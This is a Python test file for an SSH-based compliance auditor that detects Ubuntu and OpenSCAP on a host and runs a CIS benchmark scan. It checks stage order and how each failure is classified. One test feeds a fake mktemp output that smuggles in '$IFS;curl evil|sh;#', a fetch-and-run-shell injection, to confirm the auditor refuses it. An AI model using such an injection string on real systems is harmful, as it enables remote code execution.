"""Tests for grc_auditor.assess: the per-host reach -> detect -> scan pass.

assess_host takes a ``connect`` factory, so these tests hand it one that
returns a FakeRemoteHost and run the real detect and scan_host against it. No
monkeypatching, no network, no SSH stack. The tests pin:

  * the ORDER of the sequence (reach, then detect's commands, then the scan's),
  * that a failure at any step stops the steps after it,
  * that every way a step can fail lands the host in the right coverage bucket
    with the same detail text the pre-assess pipeline recorded (ELI-141),
  * one end-to-end case per terminal status a reachable host can end in.
"""

from __future__ import annotations

import socket

from grc_auditor.assess import assess_host
from grc_auditor.config import CredentialGroup
from grc_auditor.models import HostRecord, HostStatus
from grc_auditor.remote import (
    CommandResult, ConnectionFailed, HostKeyMismatch, RemoteError,
)

from conftest import FakeRemoteHost, fixture_path, make_config

_IP = "10.0.10.21"
_PROFILE = "xccdf_org.ssgproject.content_profile_cis_level1_server"
_UBUNTU_OSR = 'ID=ubuntu\nVERSION_ID="22.04"\n'
_TMP = "/tmp/grc_audit.Ab3xZ9"
_TRIAGE_DETAIL = "ssh banner says Ubuntu"

# detect's probes, in the order detect runs them, all succeeding.
_DETECT_OK = [
    ("os-release", CommandResult(0, _UBUNTU_OSR, "")),
    ("true", CommandResult(0, "", "")),
    ("command -v oscap", CommandResult(0, "/usr/bin/oscap", "")),
    ("--version", CommandResult(0, "OpenSCAP 1.3.6", "")),
    ("oscap info", CommandResult(0, f"Profiles:\n  {_PROFILE}\n", "")),
]
# scan_host's commands, all succeeding.
_SCAN_OK = [
    ("mktemp", CommandResult(0, _TMP, "")),
    ("xccdf eval", CommandResult(0, "", "")),
]
_READY = "Ubuntu 22.04, OpenSCAP 1.3.6, CIS L1 ready"


def _results_xml(*results):
    rows = "".join(
        f'  <rule-result idref="r{i}"><result>{r}</result></rule-result>\n'
        for i, r in enumerate(results)
    )
    return ('<?xml version="1.0"?>\n'
            '<TestResult xmlns="http://checklists.nist.gov/xccdf/1.2">\n'
            f'{rows}</TestResult>\n')


def _fixture_results():
    with open(fixture_path("xccdf-results.xml"), encoding="utf-8") as fh:
        return fh.read()


class _Session:
    """What ``connect(...)`` returns: a context manager around the fake host."""

    def __init__(self, factory):
        self._factory = factory

    def __enter__(self):
        f = self._factory
        if f.enter_exc is not None:
            raise f.enter_exc
        f.events.append("reach")
        f.commands_at_reach = len(f.conn.commands)
        return f.conn

    def __exit__(self, *exc):
        self._factory.events.append("close")
        if self._factory.exit_exc is not None:
            raise self._factory.exit_exc
        return False


class _Connect:
    """The ``connect`` seam: records each call and the session events."""

    def __init__(self, conn=None, *, enter_exc=None, exit_exc=None,
                 call_exc=None):
        self.conn = conn if conn is not None else FakeRemoteHost()
        self.enter_exc = enter_exc
        self.exit_exc = exit_exc
        self.call_exc = call_exc
        self.calls = []
        self.events = []
        self.commands_at_reach = None

    def __call__(self, ip, group, known_hosts):
        self.calls.append((ip, group.name, known_hosts))
        if self.call_exc is not None:
            raise self.call_exc
        return _Session(self)


class _RaisingHost(FakeRemoteHost):
    """FakeRemoteHost that raises ``exc`` for the first command containing
    ``trigger`` (both run and run_argv)."""

    def __init__(self, trigger, exc, *a, **k):
        super().__init__(*a, **k)
        self._trigger = trigger
        self._exc = exc

    def _match(self, command):
        if self._exc is not None and self._trigger in command:
            self.commands.append(command)
            exc, self._exc = self._exc, None
            raise exc
        return super()._match(command)


class _CleanupTimesOutHost(FakeRemoteHost):
    """FakeRemoteHost whose ``rm -rf`` cleanup fails the way RemoteHost.run
    does: a RemoteError raised while handling a socket timeout."""

    def _match(self, command):
        if command.startswith("rm -rf"):
            self.commands.append(command)
            try:
                raise socket.timeout("timed out")
            except socket.timeout:
                raise RemoteError("command timed out")
        return super()._match(command)


class _CleanupResetHost(FakeRemoteHost):
    """FakeRemoteHost whose ``rm -rf`` cleanup hits a reset transport.
    RemoteHost.run does not wrap that error, so it arrives as a bare OSError."""

    def _match(self, command):
        if command.startswith("rm -rf"):
            self.commands.append(command)
            raise ConnectionResetError("connection reset by peer")
        return super()._match(command)


def _scan_command(command):
    return (command.startswith(("mktemp", "rm -rf"))
            or "xccdf eval" in command
            or f"test -f {_TMP}" in command)


def _stages(connect):
    """Collapse the run into its stage order: reach, detect, scan."""
    seq = []
    if "reach" in connect.events:
        seq.append("reach")
    for c in connect.conn.commands:
        stage = "scan" if _scan_command(c) else "detect"
        if not seq or seq[-1] != stage:
            seq.append(stage)
    return seq


def _cfg():
    return make_config(groups=[
        CredentialGroup(name="lab", ssh_user="u", targets=["default"], sudo=True),
    ])


def _host():
    return HostRecord(ip=_IP, detail=_TRIAGE_DETAIL)


def _assess(conn=None, cfg=None, tmp_path=None, **connect_kw):
    connect = _Connect(conn, **connect_kw)
    host = _host()
    result = assess_host(host, cfg or _cfg(), "run1",
                         str(tmp_path) if tmp_path else "/tmp/artifacts",
                         connect=connect)
    assert result is host
    return result, connect


def _happy_host(files=None, extra=()):
    return FakeRemoteHost(
        responses=list(extra) + _DETECT_OK + _SCAN_OK,
        files=files if files is not None else {"results.xml": _fixture_results()},
    )


# --------------------------------------------------------------------------- #
# Sequencing (ported from the cli._process_host tests, ELI-141)
# --------------------------------------------------------------------------- #

def test_assess_runs_reach_then_detect_then_scan_in_order(tmp_path):
    host, connect = _assess(_happy_host(), tmp_path=tmp_path)

    assert connect.calls == [(_IP, "lab", None)]
    assert connect.commands_at_reach == 0         # nothing ran before reach
    assert connect.events == ["reach", "close"]
    assert _stages(connect) == ["reach", "detect", "scan"]
    cmds = connect.conn.commands
    first = {key: next(i for i, c in enumerate(cmds) if key in c)
             for key in ("os-release", "oscap info", "mktemp", "xccdf eval",
                         "rm -rf")}
    assert (first["os-release"] < first["oscap info"] < first["mktemp"]
            < first["xccdf eval"] < first["rm -rf"])
    assert host.status is HostStatus.SCANNED


def test_assess_breaking_the_order_is_caught_by_this_test(tmp_path):
    # Sanity check on the test itself: if the pipeline ran scan before detect,
    # these assertions (not just the happy-path status) must fail.
    _, connect = _assess(_happy_host(), tmp_path=tmp_path)
    stages = _stages(connect)

    assert stages != ["reach", "scan", "detect"]
    assert stages.index("reach") < stages.index("detect") < stages.index("scan")
    # The stage helper itself tells the two orders apart.
    swapped = _Connect(FakeRemoteHost())
    swapped.events.append("reach")
    swapped.conn.commands.extend(["mktemp -d x", "cat /etc/os-release"])
    assert _stages(swapped) == ["reach", "scan", "detect"]


def test_assess_no_credential_group_short_circuits_before_reach():
    cfg = make_config(groups=[
        CredentialGroup(name="dmz", ssh_user="u", targets=["10.0.99.0/24"]),
    ])
    connect = _Connect()
    host = assess_host(_host(), cfg, "run1", "/tmp/artifacts", connect=connect)

    assert connect.calls == []                    # never even attempted to connect
    assert host.status is HostStatus.NO_CREDENTIALS
    assert host.detail == "no credential group matched"


def test_assess_reach_failure_stops_detect_and_scan():
    host, connect = _assess(enter_exc=RemoteError("connection refused"))

    assert connect.events == []
    assert connect.conn.commands == []
    assert host.status is HostStatus.UNREACHABLE
    assert host.detail == "connection refused"


def test_assess_reach_timeout_lands_in_unreachable_bucket():
    # ConnectionFailed (raised by remote.py for a connect-level socket.timeout)
    # is a RemoteError subclass; it must still land the host in UNREACHABLE,
    # not fall through to the generic/unexpected-error branch.
    host, connect = _assess(
        enter_exc=ConnectionFailed("connection to 10.0.10.21 timed out"),
    )

    assert connect.conn.commands == []
    assert host.status is HostStatus.UNREACHABLE
    assert "timed out" in host.detail


def test_assess_host_key_mismatch_stops_detect_and_scan():
    host, connect = _assess(
        enter_exc=HostKeyMismatch("host-key MISMATCH for 10.0.10.21"),
    )

    assert connect.conn.commands == []
    assert host.status is HostStatus.HOST_KEY_MISMATCH
    assert host.detail == "host-key MISMATCH for 10.0.10.21"


def test_assess_detect_failure_stops_scan():
    # detect returning a Verdict means it explained why it cannot scan; the scan
    # must never run afterward.
    conn = FakeRemoteHost(responses=[
        ("os-release", CommandResult(0, _UBUNTU_OSR, "")),
        ("true", CommandResult(0, "", "")),
        ("command -v oscap", CommandResult(1, "", "")),
    ])
    host, connect = _assess(conn)

    assert _stages(connect) == ["reach", "detect"]
    assert not any(_scan_command(c) for c in conn.commands)
    assert host.status is HostStatus.SCANNER_ABSENT
    assert host.detail == ("oscap binary not found (likely apt package "
                           "'libopenscap8'); not installing - audit integrity")


def test_assess_detect_unexpected_error_lands_in_scan_error():
    conn = _RaisingHost("os-release", ValueError("bad os-release"))
    host, connect = _assess(conn)

    assert _stages(connect) == ["reach", "detect"]
    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "unexpected error: bad os-release"


def test_assess_detect_remote_error_is_unreachable():
    # A RemoteError mid-detect (the session dropped) is a reach failure.
    conn = _RaisingHost("os-release", RemoteError("channel closed"))
    host, _ = _assess(conn)

    assert host.status is HostStatus.UNREACHABLE
    assert host.detail == "channel closed"


def test_assess_scan_unexpected_error_is_defaulted_to_scan_error(tmp_path):
    # scan_host raised something other than ScanFailed; assess still lands the
    # host in SCAN_ERROR with a useful detail, and the temp-dir cleanup ran.
    conn = _RaisingHost("xccdf eval", RuntimeError("oscap crashed"),
                        responses=_DETECT_OK + _SCAN_OK)
    host, connect = _assess(conn, tmp_path=tmp_path)

    assert _stages(connect) == ["reach", "detect", "scan"]
    assert any(c.startswith("rm -rf") for c in conn.commands)
    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "scan failed: oscap crashed"
    assert host.scan is None


def test_assess_scan_failed_detail_is_recorded_verbatim(tmp_path):
    # A known scan failure (ScanFailed) records its own detail, never the
    # generic "scan failed: ..." fallback.
    conn = FakeRemoteHost(responses=_DETECT_OK + [
        ("mktemp", CommandResult(0, _TMP, "")),
        ("xccdf eval", CommandResult(1, "", "bad profile")),
    ])
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "oscap error (exit 1): bad profile"


def test_assess_scan_failed_detail_survives_a_failing_cleanup(tmp_path):
    # scan_host raised ScanFailed, then its finally-block cleanup raised too,
    # chained the way the real RemoteHost chains it. The known failure's
    # detail is the one recorded, as before assess existed.
    conn = _CleanupTimesOutHost(responses=_DETECT_OK + [
        ("mktemp", CommandResult(0, _TMP, "")),
        ("xccdf eval", CommandResult(1, "", "bad profile")),
    ])
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert any(c.startswith("rm -rf") for c in conn.commands)
    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "oscap error (exit 1): bad profile"
    assert host.scan is None


def test_assess_cleanup_failure_after_a_finished_scan_keeps_the_evidence(tmp_path):
    # The scan parsed, then the cleanup failed. The host is a scan error, as
    # before assess existed, and the parsed scan stays attached.
    conn = _CleanupTimesOutHost(responses=_DETECT_OK + _SCAN_OK,
                                files={"results.xml": _fixture_results()})
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "scan failed: command timed out"
    assert host.scan is not None
    assert host.scan.passed > 0


def test_assess_cleanup_failure_after_a_refused_scan_keeps_the_refusal(tmp_path):
    # A sub-floor scan followed by a failed cleanup records the chokepoint's
    # reason, which is the one the operator can act on.
    xml = _results_xml("pass", "notchecked", "notchecked")
    conn = _CleanupTimesOutHost(responses=_DETECT_OK + _SCAN_OK,
                                files={"results.xml": xml})
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail.startswith("assessment incomplete: only 33%")
    assert host.scan is not None


def test_assess_scan_failed_detail_survives_a_reset_during_cleanup(tmp_path):
    # Same as above, but the cleanup error is one RemoteHost.run leaves
    # unwrapped. The oscap detail is still the one recorded.
    conn = _CleanupResetHost(responses=_DETECT_OK + [
        ("mktemp", CommandResult(0, _TMP, "")),
        ("xccdf eval", CommandResult(1, "", "bad profile")),
    ])
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "oscap error (exit 1): bad profile"


def test_assess_reset_during_cleanup_after_a_refused_scan_keeps_the_refusal(tmp_path):
    xml = _results_xml("pass", "notchecked", "notchecked")
    conn = _CleanupResetHost(responses=_DETECT_OK + _SCAN_OK,
                             files={"results.xml": xml})
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail.startswith("assessment incomplete: only 33%")
    assert host.scan is not None


def test_assess_unexpected_exception_outside_remote_lands_in_scan_error():
    # An exception that is neither HostKeyMismatch nor RemoteError (e.g. a bug
    # surfaced while building the connection) must still be caught and turned
    # into an honest SCAN_ERROR rather than crashing the whole run.
    host, connect = _assess(call_exc=KeyError("boom"))

    assert connect.events == []
    assert connect.conn.commands == []
    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "unexpected error: 'boom'"


def test_assess_session_close_failure_after_scan_overrides_the_verdict(tmp_path):
    # The verdict is recorded inside the session, so a failure while closing it
    # still lands in the reach handlers, as it did before assess existed.
    host, _ = _assess(_happy_host(), tmp_path=tmp_path,
                      exit_exc=RemoteError("transport dropped on close"))

    assert host.status is HostStatus.UNREACHABLE
    assert host.detail == "transport dropped on close"


# --------------------------------------------------------------------------- #
# End-to-end terminal statuses
# --------------------------------------------------------------------------- #

def test_assess_scanned_records_ready_detail_and_evidence(tmp_path):
    host, _ = _assess(_happy_host(), tmp_path=tmp_path)

    assert host.status is HostStatus.SCANNED
    assert host.detail == _READY
    assert host.is_ubuntu is True
    assert host.ubuntu_version == "22.04"
    assert host.scan is not None
    assert (host.scan.passed, host.scan.failed) == (3, 2)
    assert host.scan.profile_id == _PROFILE


def test_assess_scanned_without_oscap_version_keeps_triage_detail(tmp_path):
    # detect sets the ready line only when it learned the oscap version; without
    # it a SCANNED host keeps the detail it already had.
    conn = _happy_host(extra=[("--version", CommandResult(1, "", ""))])
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCANNED
    assert host.detail == _TRIAGE_DETAIL


def test_assess_non_ubuntu():
    conn = FakeRemoteHost(responses=[
        ("os-release", CommandResult(0, 'ID=debian\nVERSION_ID="12"\n', "")),
    ])
    host, connect = _assess(conn)

    assert _stages(connect) == ["reach", "detect"]
    assert host.status is HostStatus.NON_UBUNTU
    assert host.detail == "os-release ID=debian (not Ubuntu)"
    assert host.is_ubuntu is False


def test_assess_unsupported_version():
    conn = FakeRemoteHost(responses=[
        ("os-release", CommandResult(0, 'ID=ubuntu\nVERSION_ID="19.10"\n', "")),
    ])
    host, _ = _assess(conn)

    assert host.status is HostStatus.UNSUPPORTED_VERSION
    assert host.detail.startswith("Ubuntu 19.10: no SSG CIS profile available")
    assert host.is_ubuntu is True


def test_assess_unreadable_os_release_is_scan_error():
    conn = FakeRemoteHost(responses=[
        ("os-release", CommandResult(1, "", "permission denied")),
    ])
    host, _ = _assess(conn)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "could not read /etc/os-release (exit 1)"


def test_assess_malicious_mktemp_is_scan_error(tmp_path):
    conn = _happy_host(extra=[
        ("mktemp", CommandResult(0, "/tmp/grc_audit.aaaaaa$IFS;curl evil|sh;#", "")),
    ])
    host, _ = _assess(conn, tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "mktemp returned an unexpected path; refusing to proceed"
    assert not any("xccdf eval" in c for c in conn.commands)


def test_assess_zero_outcome_scan_is_scan_error_with_evidence(tmp_path):
    # An oscap success whose results.xml holds no rule outcomes must NOT read as
    # a clean host, and the evidence stays attached.
    host, _ = _assess(_happy_host(files={"results.xml": ""}), tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == "oscap produced results.xml with no rule outcomes to assess"
    assert host.scan is not None


def test_assess_all_notselected_scan_is_scan_error_with_evidence(tmp_path):
    xml = _results_xml("notselected", "notselected", "notselected")
    host, _ = _assess(_happy_host(files={"results.xml": xml}), tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert "no scorable verdict" in host.detail
    assert host.scan is not None
    assert host.scan.other == 3


def test_assess_sub_floor_scan_is_scan_error_with_evidence(tmp_path):
    # 1 definitive of 3 owed -> 33%, below the 50% hard floor.
    xml = _results_xml("pass", "notchecked", "notchecked")
    host, _ = _assess(_happy_host(files={"results.xml": xml}), tmp_path=tmp_path)

    assert host.status is HostStatus.SCAN_ERROR
    assert host.detail == (
        "assessment incomplete: only 33% of the selected benchmark produced a "
        "verdict (below the 50% hard floor) -- evidence retained but not "
        "certifiable; check the scan account's sudo/privilege"
    )
    assert host.scan is not None
